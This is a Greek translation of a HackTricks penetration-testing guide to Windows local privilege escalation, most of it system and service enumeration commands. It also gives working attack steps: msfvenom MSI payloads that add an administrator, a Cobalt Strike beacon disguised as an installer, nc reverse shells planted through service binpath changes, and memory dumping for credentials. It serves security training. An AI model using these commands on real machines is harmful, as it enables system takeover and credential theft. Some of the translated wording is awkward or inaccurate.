# Ανύψωση Προνομίων Τοπικά στα Windows

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks για το AWS)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στο **αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Καλύτερο εργαλείο για αναζήτηση διανυσμάτων ανύψωσης προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική Θεωρία Windows

### Διακριτικά Πρόσβασης

**Αν δεν γνωρίζετε τι είναι τα Διακριτικά Πρόσβασης των Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Ελέγξτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Επίπεδα Ακεραιότητας

**Αν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, πρέπει να διαβάσετε την παρακάτω σελίδα πριν συνεχίσετε:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Ελέγχοι Ασφαλείας Windows

Υπάρχουν διάφορα πράγματα στα Windows που θα μπορούσαν **να σας εμποδίσουν από τον απαρίθμηση του συστήματος**, την εκτέλεση εκτελέσιμων αρχείων ή ακόμη και **να ανιχνεύσουν τις δραστηριότητές σας**. Θα πρέπει **να διαβάσετε** την ακόλουθη **σελίδα** και **να απαριθμήσετε** όλα αυτά τα **μηχανισμούς άμυνας** πριν ξεκινήσετε την απαρίθμηση ανύψωσης προνομίων:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Πληροφορίες Συστήματος

### Απαρίθμηση πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τις ενημερώσεις που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Εκμετάλλευση Εκδόσεων

Αυτό το [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμο για την αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπαθείς σημεία ασφαλείας της Microsoft. Αυτή η βάση δεδομένων έχει περισσότερες από 4.700 ευπαθείς σημεία ασφαλείας, δείχνοντας την **μαζική επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Το Winpeas έχει ενσωματωμένο το watson)_

**Τοπικά με πληροφορίες συστήματος**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Αποθετήρια στο Github με εκμεταλλεύσεις:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν κάποια διαπιστευτήρια/Χυμώδεις πληροφορίες που έχουν αποθηκευτεί στις μεταβλητές περιβάλλοντος;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Ιστορικό PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία καταγραφής PowerShell Transcript

Μπορείτε να μάθετε πώς να ενεργοποιήσετε αυτή τη λειτουργία στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Καταγραφή Ενότητας PowerShell

Λεπτομέρειες εκτελέσεων αγωγών PowerShell καταγράφονται, περιλαμβάνοντας εκτελεσθέντες εντολές, κλήσεις εντολών και τμήματα σεναρίων. Ωστόσο, ενδέχεται να μην καταγράφονται πλήρως λεπτομέρειες εκτέλεσης και αποτελέσματα εξόδου.

Για να ενεργοποιήσετε αυτήν τη λειτουργία, ακολουθήστε τις οδηγίες στην ενότητα "Αρχεία Μεταγραφής", επιλέγοντας το **"Καταγραφή Ενότητας"** αντί για το **"Μεταγραφή Powershell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 συμβάντα από τα logs του Powershell μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### Καταγραφή Μπλοκ Σεναρίου PowerShell

Καταγράφεται μια πλήρης εγγραφή δραστηριότητας και περιεχομένου της εκτέλεσης του σεναρίου, εξασφαλίζοντας ότι κάθε μπλοκ κώδικα καταγράφεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί έναν πλήρη απολογισμό ελέγχου κάθε δραστηριότητας, πολύτιμος για την ανάλυση ψηφιακών αποδεικτικών στοιχείων και την ανάλυση κακόβουλης συμπεριφοράς. Με την καταγραφή όλων των δραστηριοτήτων κατά την εκτέλεση, παρέχονται λεπτομερείς εισαγωγές στη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα γεγονότα καταγραφής για το Script Block μπορούν να βρεθούν στον Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 γεγονότα, μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Διαδικτύου
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Δίσκοι
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να εκμεταλλευτείτε το σύστημα εάν οι ενημερώσεις δεν ζητούνται χρησιμοποιώντας http**S** αλλά http.

Ξεκινήστε ελέγχοντας εάν το δίκτυο χρησιμοποιεί μη-SSL ενημερώσεις WSUS εκτελώντας το παρακάτω:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Εάν λάβετε μια απάντηση όπως:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` είναι ίσο με `1`.

Τότε, **είναι εκμεταλλεύσιμο.** Αν το τελευταίο καταχωρίσει είναι ίσο με 0, τότε, η καταχώριση WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Αυτά είναι σενάρια εκμετάλλευσης όπλων MiTM για να εισάγουν 'ψεύτικες' ενημερώσεις στην μη-SSL κίνηση WSUS.

Διαβάστε την έρευνα εδώ:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη έκθεση εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Βασικά, αυτή είναι η αδυναμία που εκμεταλλεύεται αυτό το σφάλμα:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον τοπικό μας διακομιστή proxy και οι ενημερώσεις των Windows χρησιμοποιούν τον διακομιστή proxy που έχει ρυθμιστεί στις ρυθμίσεις του Internet Explorer, έχουμε συνεπώς τη δυνατότητα να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά για να παρεμβάλουμε τη δική μας κίνηση και να εκτελέσουμε κώδικα ως υψηλότερος χρήστης στο περιουσιακό μας στοιχείο.
>
> Επιπλέον, καθώς ο υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, θα χρησιμοποιήσει επίσης το αποθετήριο πιστοποιητικών του. Αν δημιουργήσουμε ένα πιστοποιητικό αυτο-υπογεγραμμένο για το όνομα κεντρικού υπολογιστή WSUS και προσθέσουμε αυτό το πιστοποιητικό στο αποθετήριο πιστοποιητικών του τρέχοντος χρήστη, θα μπορούμε να παρεμβάλουμε την κίνηση WSUS τόσο HTTP όσο και HTTPS. Η υπηρεσία WSUS δεν χρησιμοποιεί μηχανισμούς παρόμοιους με το HSTS για να εφαρμόσει μια επικύρωση τύπου εμπιστοσύνης-στην-πρώτη-χρήση στο πιστοποιητικό. Αν το πιστοποιητικό που παρουσιάζεται είναι εμπιστευμένο από τον χρήστη και έχει το σωστό όνομα κεντρικού υπολογιστή, θα γίνει αποδεκτό από την υπηρεσία.

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (όταν απελευθερωθεί).

## KrbRelayUp

Μια **ευπάθεια εκμετάλλευσης προνομίων στοπληροφοριών** υπάρχει σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες συνθήκες. Αυτές οι συνθήκες περιλαμβάνουν περιβάλλοντα όπου **δεν επιβάλλεται η υπογραφή LDAP,** οι χρήστες διαθέτουν δικαιώματα αυτο-δικαιωμάτων που τους επιτρέπουν να ρυθμίσουν **Περιορισμένη Ανάθεση Πόρων βάσει Αντικειμένου (RBCD),** και η δυνατότητα για τους χρήστες να δημιουργούν υπολογιστές εντός του τομέα. Σημαντικό είναι να σημειωθεί ότι αυτές οι **απαιτήσεις** πληρούνται χρησιμοποιώντας τις **προεπιλεγμένες ρυθμίσεις**.

Βρείτε την **εκμετάλλευση** στο [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης ελέγξτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Αν** αυτά τα 2 καταχωρίσεις είναι **ενεργοποιημένες** (η τιμή είναι **0x1**), τότε οι χρήστες οποιουδήποτε προνόμιου μπορούν να **εγκαταστήσουν** (εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Φορτία Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Αν έχετε μια συνεδρία meterpreter, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας τον ενότητα **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα δυαδικό αρχείο Windows MSI για την ανάδειξη προνομίων. Αυτό το σενάριο γράφει ένα προεπιλεγμένο εγκαταστάτη MSI που ζητάει προσθήκη χρήστη/ομάδας (επομένως θα χρειαστείτε πρόσβαση στο GUI):
```
Write-UserAddMSI
```
### Περιτύλιγμα MSI

Διαβάστε αυτό το εγχειρίδιο για να μάθετε πώς να δημιουργήσετε ένα περιτύλιγμα MSI χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να περιτυλίξετε ένα αρχείο "**.bat**" αν θέλετε απλά να εκτελέσετε γραμμές εντολών.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Δημιουργία MSI με WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Δημιουργία MSI με το Visual Studio

* **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
* Ανοίξτε το **Visual Studio**, επιλέξτε **Δημιουργία νέου έργου** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το έργο **Setup Wizard** και κάντε κλικ στο **Επόμενο**.
* Δώστε στο έργο ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποιήστε το **`C:\privesc`** για την τοποθεσία, επιλέξτε **τοποθέτηση λύσης και έργου στον ίδιο κατάλογο**, και κάντε κλικ στο **Δημιουργία**.
* Συνεχίστε να κάνετε κλικ στο **Επόμενο** μέχρι να φτάσετε στο βήμα 3 από 4 (επιλογή αρχείων για συμπερίληψη). Κάντε κλικ στο **Προσθήκη** και επιλέξτε το payload Beacon που μόλις δημιουργήσατε. Στη συνέχεια, κάντε κλικ στο **Ολοκλήρωση**.
* Επισημάνετε το έργο **AlwaysPrivesc** στο **Εξερευνητή λύσεων** και στις **Ιδιότητες**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
* Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως ο **Συγγραφέας** και ο **Κατασκευαστής** που μπορεί να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
* Δεξί κλικ στο έργο και επιλέξτε **Προβολή > Προσαρμοσμένες ενέργειες**.
* Δεξί κλικ στην **Εγκατάσταση** και επιλέξτε **Προσθήκη προσαρμοσμένης ενέργειας**.
* Διπλό κλικ στο **Φάκελος Εφαρμογής**, επιλέξτε το αρχείο **beacon.exe** σας και κάντε κλικ στο **ΟΚ**. Αυτό θα εξασφαλίσει ότι το payload του beacon θα εκτελεστεί αμέσως μόλις εκτελεστεί ο εγκαταστάτης.
* Υπό τις **Ιδιότητες Προσαρμοσμένης Ενέργειας**, αλλάξτε το **Run64Bit** σε **True**.
* Τέλος, **κάντε την κατασκευή**.
* Αν εμφανιστεί το προειδοποιητικό μήνυμα `Το αρχείο 'beacon-tcp.exe' που στοχεύει σε 'x64' δεν είναι συμβατό με την κατεύθυνση της πλατφόρμας στόχου του έργου 'x86'`, βεβαιωθείτε ότι έχετε ορίσει την πλατφόρμα σε x64.

### Εγκατάσταση MSI

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always\_install\_elevated_

## Αντιιικά και Ανιχνευτές

### Ρυθμίσεις Ελέγχου

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, οπότε πρέπει να είστε προσεκτικοί
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Η Προώθηση Συμβάντων των Windows (Windows Event Forwarding) είναι ενδιαφέρον να γνωρίζουμε πού στέλνονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** σχεδιάστηκε για τη **διαχείριση των τοπικών κωδικών διαχειριστή**, εξασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που είναι ενταγμένοι σε έναν τομέα. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια μέσα στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες που έχουν δοθεί επαρκή δικαιώματα μέσω των ACLs, επιτρέποντάς τους να προβάλλουν τους τοπικούς κωδικούς διαχειριστή εάν έχουν εξουσιοδοτηθεί.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Εάν είναι ενεργό, **οι κωδικοί σε καθαρό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες σχετικά με το WDigest σε αυτήν τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Προστασία LSA

Αρχίζοντας από τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για την Τοπική Αρχή Ασφαλείας (LSA) για να **αποκλείσει** προσπάθειες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη της** ή να ενθέσουν κώδικα, ενισχύοντας περαιτέρω το σύστημα.\
[**Περισσότερες πληροφορίες σχετικά με την Προστασία LSA εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Προστασία Διαπιστευτηρίων

Η **Προστασία Διαπιστευτηρίων** εισήχθη στα **Windows 10**. Ο σκοπός της είναι να προστατεύει τα διαπιστευτήρια που αποθηκεύονται σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash. | [**Περισσότερες πληροφορίες σχετικά με την Προστασία Διαπιστευτηρίων εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Τα **διαπιστευτήρια τομέα** ελέγχονται από την **Τοπική Αρχή Ασφαλείας** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη ελέγχονται από ένα εγγεγραμμένο πακέτο ασφαλείας, συνήθως δημιουργούνται διαπιστευτήρια τομέα για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα Αποθηκευμένα Διαπιστευτήρια εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Πρέπει να ελέγξετε εάν κάποια από τις ομάδες στις οποίες ανήκετε έχουν ενδιαφέρουσες άδειες.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχα ομάδα, μπορείτε να αναβαθμίσετε τα προνόμιά σας**. Μάθετε σχετικά με τις προνομιούχες ομάδες και πώς να τις εκμεταλλευτείτε για την αναβάθμιση προνομίων εδώ:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Αλλαγή διακριτικών

Μάθετε περισσότερα για το τι είναι ένα **διακριτικό** σε αυτήν τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Ελέγξτε την παρακάτω σελίδα για να **μάθετε για ενδιαφέροντα διακριτικά** και πώς να τα εκμεταλλευτείτε:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Συνδεδεμένοι χρήστες / Συνεδρίες
```bash
qwinsta
klist sessions
```
### Φάκελοι Αρχικού Καταλόγου
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών πρόσβασης
```bash
net accounts
```
### Λήψη του περιεχομένου του πρόχειρου
```bash
powershell -command "Get-Clipboard"
```
## Εκτέλεση Διεργασιών

### Δικαιώματα Αρχείων και Φακέλων

Καταρχάς, η λίστα των διεργασιών **ελέγχει για κωδικούς πρόσβασης μέσα στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε **να αντικαταστήσετε κάποιο δυαδικό που εκτελείται** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του δυαδικού για να εκμεταλλευτείτε πιθανές [επιθέσεις **DLL Hijacking**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Πάντα ελέγχετε για πιθανούς **αποσφαλματωτές electron/cef/chromium** που εκτελούνται, μπορείτε να τους εκμεταλλευτείτε για να αναβαθμίσετε δικαιώματα.

**Έλεγχος δικαιωμάτων των διεργασιών των δυαδικών αρχείων**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος των δικαιωμάτων των φακέλων των διεργασιών των δυαδικών αρχείων (**[**Απάτη DLL**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Εξόρυξη Κωδικών Μνήμης

Μπορείτε να δημιουργήσετε ένα αντίγραφο μνήμης ενός εκτελούμενου διεργασίας χρησιμοποιώντας το **procdump** από τα sysinternals. Υπηρεσίες όπως το FTP έχουν τα **διαπιστευτήρια σε καθαρό κείμενο στη μνήμη**, προσπαθήστε να κάνετε αντίγραφο της μνήμης και να διαβάσετε τα διαπιστευτήρια.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Επισφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM μπορεί να επιτρέψουν σε έναν χρήστη να εκκινήσει ένα CMD ή να περιηγηθεί σε φακέλους.**

Παράδειγμα: "Βοήθεια και Υποστήριξη των Windows" (Windows + F1), αναζητήστε "command prompt", κάντε κλικ στο "Κάντε κλικ για να ανοίξετε το Command Prompt"

## Υπηρεσίες

Λήψη λίστας υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες για ένα υπηρεσία.
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το δυαδικό αρχείο **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε εάν οι "Εξουσιοδοτημένοι Χρήστες" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν αντιμετωπίζετε αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Μπορείτε να το ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Να ληφθεί υπόψη ότι η υπηρεσία upnphost εξαρτάται από την υπηρεσία SSDPSRV για να λειτουργήσει (για το XP SP1)**

**Ένας άλλος τρόπος** αντιμετώπισης αυτού του προβλήματος είναι η εκτέλεση:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση της διαδρομής του δυαδικού αρχείου υπηρεσίας**

Στην περίπτωση όπου η ομάδα "Εξουσιοδοτημένοι χρήστες" διαθέτει **SERVICE\_ALL\_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα δικαιώματα μπορούν να αναβαθμιστούν μέσω διαφόρων άδειών:

* **SERVICE\_CHANGE\_CONFIG**: Επιτρέπει την αναδιαμόρφωση του δυαδικού της υπηρεσίας.
* **WRITE\_DAC**: Ενεργοποιεί την αναδιάρθρωση δικαιωμάτων, οδηγώντας στη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
